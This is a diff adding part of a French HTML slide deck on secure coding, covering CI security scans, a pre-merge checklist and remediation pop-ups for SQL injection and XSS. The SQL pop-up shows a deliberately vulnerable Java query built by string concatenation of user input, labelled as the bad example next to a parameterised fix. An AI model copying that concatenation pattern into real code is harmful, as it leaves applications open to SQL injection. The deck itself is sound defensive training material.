+              <div class="w-12 h-12 rounded-full bg-slate-800 border-2 border-blue-500 flex items-center justify-center z-10"><i class="fa-solid fa-vial"></i></div>
+              <div class="text-blue-400">Tests unitaires</div>
+            </div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-12 h-12 rounded-full bg-slate-800 border-2 border-red-500 flex items-center justify-center z-10"><i class="fa-solid fa-key"></i></div>
+              <div class="text-red-300">Scan secrets <span class="text-xs ml-2 bg-red-900 text-red-200 px-2 py-0.5 rounded">BLOCK</span></div>
+            </div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-12 h-12 rounded-full bg-slate-800 border-2 border-purple-500 flex items-center justify-center z-10"><i class="fa-solid fa-microscope"></i></div>
+              <div class="text-purple-300">SAST (Semgrep/Sonar)</div>
+            </div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-12 h-12 rounded-full bg-slate-800 border-2 border-yellow-500 flex items-center justify-center z-10"><i class="fa-solid fa-cubes"></i></div>
+              <div class="text-yellow-300">SCA (dépendances)</div>
+            </div>
+
+            <div class="flex items-center gap-4">
+              <div class="w-12 h-12 rounded-full bg-green-600 text-black font-bold flex items-center justify-center z-10"><i class="fa-solid fa-check"></i></div>
+              <div class="text-green-300 font-bold">Build</div>
+            </div>
+          </div>
+
+          <p class="mt-6 text-xs text-slate-400 text-center">
+            Le pipeline doit être rapide, explicable, et appliqué à chaque PR.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 18: Checklist -->
+    <div class="slide justify-center items-center text-center" id="slide-18" data-title="Checklist Développeur (Action)">
+      <h2 class="text-5xl font-bold font-mono text-white mb-8">Checklist Développeur</h2>
+
+      <div class="bg-cyber-card border border-cyber-accent p-8 rounded-xl max-w-4xl w-full text-left">
+        <h3 class="text-2xl font-bold text-cyber-accent mb-6 font-mono"><i class="fa-solid fa-clipboard-check mr-3"></i>Avant de merger</h3>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <ul class="space-y-4 text-lg text-white font-mono">
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>Entrées validées et typées côté serveur</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>0 concat SQL (requêtes paramétrées)</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>Sorties encodées selon le contexte (anti-XSS)</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>AuthZ par objet vérifiée (anti-IDOR)</span>
+            </li>
+          </ul>
+
+          <ul class="space-y-4 text-lg text-white font-mono">
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>DTO strict (anti-mass assignment)</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>Pas de secrets dans le code / logs propres</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>Dépendances scannées / lockfile stable</span>
+            </li>
+            <li class="flex items-center gap-3">
+              <input type="checkbox" class="w-6 h-6 accent-cyber-accent" disabled>
+              <span>CI verte avec scans (secrets/SAST/SCA)</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 19: Prochaines étapes -->
+    <div class="slide justify-center" id="slide-19" data-title="Prochaines étapes (Demain)">
+      <div class="flex items-center gap-4 mb-6 border-b border-slate-700 pb-4">
+        <span class="font-mono text-cyber-accent text-xl">CONCLUSION</span>
+        <h2 class="text-4xl font-bold font-mono text-white">Prochaines étapes</h2>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 items-start">
+        <div class="bg-cyber-card border border-slate-700 p-6 rounded-xl">
+          <h3 class="text-xl font-bold text-white mb-4 font-mono">Pour demain matin (plan concret)</h3>
+          <ol class="list-decimal pl-6 text-sm text-slate-300 space-y-2">
+            <li>Lancer un scan baseline (secrets + SAST + SCA) sur le projet actuel.</li>
+            <li>Créer une checklist PR Niveau 1 (blocking) et l’appliquer sur les endpoints sensibles.</li>
+            <li>Choisir 3 règles Semgrep “must-have” (req.body direct, innerHTML, fetch(url)).</li>
+            <li>Mettre en place un gate CI: échec si secret détecté ou vulnérabilité critique.</li>
+            <li>Planifier une session de remédiation: top findings, quick wins, tests de non-régression.</li>
+          </ol>
+
+          <div class="mt-6 bg-green-900/20 border border-green-500/30 p-4 rounded text-sm text-green-200">
+            Résultat attendu: baisse rapide des findings récurrents dès le prochain audit.
+          </div>
+        </div>
+
+        <div class="terminal-box flex flex-col">
+          <div class="terminal-header">
+            <div class="dot dot-red"></div>
+            <div class="dot dot-yellow"></div>
+            <div class="dot dot-green"></div>
+            <span class="text-xs text-slate-400 font-mono ml-2">deliverables.md</span>
+          </div>
+          <div class="p-5 text-xs font-mono text-slate-200 space-y-3">
+            <p class="text-green-400"># Livrables internes</p>
+            <p>- Checklist PR Niveau 1 (blocking)</p>
+            <p>- Guide DTO: entrées/sorties + validation</p>
+            <p>- Policy logs: redaction + PII</p>
+            <p>- CSP baseline (et exceptions documentées)</p>
+
+            <p class="text-yellow-400 mt-4"># Indicateurs</p>
+            <p>- Nombre de régressions Niveau 1 bloquées en CI</p>
+            <p>- Temps moyen de correction findings</p>
+            <p>- Réduction findings récurrents d’un pentest à l’autre</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SLIDE 20: Q&A -->
+    <div class="slide justify-center items-center text-center" id="slide-20" data-title="Q&A">
+      <div class="max-w-4xl w-full">
+        <h2 class="text-6xl font-bold font-mono text-white mb-6">Q&A</h2>
+        <div class="w-32 h-1 bg-cyber-accent mx-auto mb-8"></div>
+
+        <div class="bg-cyber-card border border-slate-700 rounded-xl p-8 text-left">
+          <h3 class="text-2xl font-bold text-cyber-accent mb-6 font-mono">Questions fréquentes</h3>
+
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-sm text-slate-300">
+            <div class="bg-slate-900 border border-slate-700 rounded p-5">
+              <div class="font-mono text-slate-100 font-bold mb-2">“On a un ORM, donc pas de SQLi ?”</div>
+              <p>Non. Les valeurs sont souvent paramétrées, mais pas les identifiants dynamiques, ni les “raw queries”, ni certains helpers mal utilisés.</p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-5">
+              <div class="font-mono text-slate-100 font-bold mb-2">“React protège de XSS, donc CSP inutile ?”</div>
+              <p>React réduit le risque, mais CSP limite l’impact si une injection passe via un rendu HTML, une lib, un markdown, ou un DOM XSS.</p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-5">
+              <div class="font-mono text-slate-100 font-bold mb-2">“Pourquoi bloquer en CI ?”</div>
+              <p>Parce que la sécurité n’est pas un audit ponctuel: c’est un invariant contrôlé à chaque PR.</p>
+            </div>
+
+            <div class="bg-slate-900 border border-slate-700 rounded p-5">
+              <div class="font-mono text-slate-100 font-bold mb-2">“On commence par quoi ?”</div>
+              <p>Niveau 1: validation serveur, requêtes paramétrées, authZ objet, secrets, logs propres, scans CI.</p>
+            </div>
+          </div>
+
+          <p class="mt-8 text-slate-400 text-sm">
+            Fin: aligner l’équipe sur des règles simples, puis automatiser pour éviter les régressions.
+          </p>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- MODALS -->
+  <div id="overlay" class="fixed inset-0 z-50 hidden flex justify-center items-center modal-overlay" onclick="closeAllModals()">
+
+    <div id="modal-sqli" class="modal-content bg-cyber-dark border border-slate-600 rounded-lg p-8 hidden w-full m-4 shadow-2xl" onclick="event.stopPropagation()">
+      <h2 class="text-2xl font-bold text-red-400 mb-4">Remédiation SQL Injection (rappel)</h2>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="terminal-box">
+          <div class="terminal-header text-red-400 font-bold text-xs">MAUVAIS</div>
+          <div class="p-4 text-xs font-mono text-slate-200">
+            String q = "SELECT * FROM users WHERE name = '" + <span class="code-danger">userInput</span> + "'";<br>
+            stmt.execute(q);
+          </div>
+        </div>
+        <div class="terminal-box">
+          <div class="terminal-header text-green-400 font-bold text-xs">BON</div>
+          <div class="p-4 text-xs font-mono text-slate-200">
+            String q = "SELECT * FROM users WHERE name = <span class="code-string">?</span>";<br>
+            PreparedStatement ps = conn.prepareStatement(q);<br>
+            ps.setString(1, <span class="code-string">userInput</span>);<br>
+            ps.executeQuery();
+          </div>
+        </div>
+      </div>
+
+      <div class="mt-6 bg-slate-900 border border-slate-700 rounded p-4 text-sm text-slate-300">
+        Bon réflexe: si une partie de requête vient de l’utilisateur, ce doit être un paramètre, jamais une concat.
+      </div>
+
+      <button onclick="closeAllModals()" class="mt-6 bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Fermer</button>
+    </div>
+
+    <div id="modal-xss" class="modal-content bg-cyber-dark border border-slate-600 rounded-lg p-8 hidden w-full m-4 shadow-2xl" onclick="event.stopPropagation()">
+      <h2 class="text-2xl font-bold text-yellow-400 mb-4">Remédiation XSS (rappel)</h2>
+
+      <div class="space-y-4">
+        <div class="bg-slate-800 p-4 rounded border border-slate-700">
+          <h3 class="font-bold text-white mb-2">Principe: encodage selon contexte</h3>
+          <p class="text-sm text-slate-300">
+            Transformer les caractères spéciaux en entités inoffensives (HTML), ou empêcher l’injection dans attribut/URL/JS.
+          </p>
+          <code class="block bg-black p-3 mt-3 rounded text-green-400 text-xs font-mono">
+            &lt;script&gt; devient &amp;lt;script&amp;gt;
+          </code>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+          <div class="bg-slate-800 p-4 rounded border border-slate-700">
+            <h4 class="text-white font-bold mb-2">Frameworks</h4>
+            <p class="text-sm text-slate-300">Protection par défaut, mais attention au HTML brut.</p>
+            <p class="text-sm text-red-300 mt-2 font-mono">dangerouslySetInnerHTML / v-html</p>
+          </div>
+          <div class="bg-slate-800 p-4 rounded border border-slate-700">
+            <h4 class="text-white font-bold mb-2">CSP</h4>
+            <p class="text-sm text-slate-300">
+              Réduit l’exploitabilité. À configurer progressivement (baseline puis durcissement).
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <button onclick="closeAllModals()" class="mt-6 bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Fermer</button>
+    </div>
+
+  </div>
+
+  <script>
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    const totalSlides = slides.length;
+
+    const hudTitle = document.getElementById('hudTitle');
+    const hudCounter = document.getElementById('hudCounter');
+    const hudProgress = document.getElementById('hudProgress');
+
+    function getSlideTitle(slideEl) {
+      return slideEl.dataset.title || slideEl.querySelector('h2,h1')?.innerText || '';
+    }
+
+    function updateHUD() {
+      const title = getSlideTitle(slides[currentSlide]);
+      hudTitle.textContent = title;
+      hudCounter.textContent = `Slide ${currentSlide + 1} / ${totalSlides}`;
+      const pct = ((currentSlide) / (totalSlides - 1)) * 100;
+      hudProgress.style.width = `${pct}%`;
+    }
+
+    function updateUI() {
+      slides.forEach(s => s.classList.remove('active'));
+      slides[currentSlide].classList.add('active');
+      updateHUD();
+    }
+
+    function goToSlide(idx) {
+      currentSlide = (idx + totalSlides) % totalSlides;
+      updateUI();
+    }
+
+    function changeSlide(direction) {
+      goToSlide(currentSlide + direction);
+    }
+
+    // Modal Logic
+    function openModal(id) {
+      document.getElementById('overlay').classList.remove('hidden');
+      document.querySelectorAll('.modal-content').forEach(el => el.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+    }
+
+    function closeAllModals() {
+      document.getElementById('overlay').classList.add('hidden');
+      document.querySelectorAll('.modal-content').forEach(el => el.classList.add('hidden'));
+    }
+
+    // Keyboard Nav
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'ArrowRight' || e.key === ' ') changeSlide(1);
+      if (e.key === 'ArrowLeft') changeSlide(-1);
+      if (e.key === 'Escape') closeAllModals();
+    });
+
+    // Buttons
+    document.getElementById('btnPrev').addEventListener('click', () => changeSlide(-1));
+    document.getElementById('btnNext').addEventListener('click', () => changeSlide(1));
+
+    // Chart logic (Slide 2)
+    const ctx = document.getElementById('costChart').getContext('2d');
+    new Chart(ctx, {
+      type: 'bar',
+      data: {
+        labels: ['Phase Dev', 'Phase Test', 'Production (Pentest)'],
+        datasets: [{
+          label: 'Coût de correction',
+          data: [1, 5, 30],
+          backgroundColor: ['#10b981', '#f59e0b', '#ef4444'],
+          borderWidth: 0
+        }]
+      },
+      options: {
+        responsive: true,
+        scales: {
+          y: { beginAtZero: true, grid: { color: '#334155' } },
+          x: { grid: { display: false } }
+        },
+        plugins: { legend: { display: false } }
+      }
+    });
+
+    updateUI();
+  </script>
+</body>
+</html>
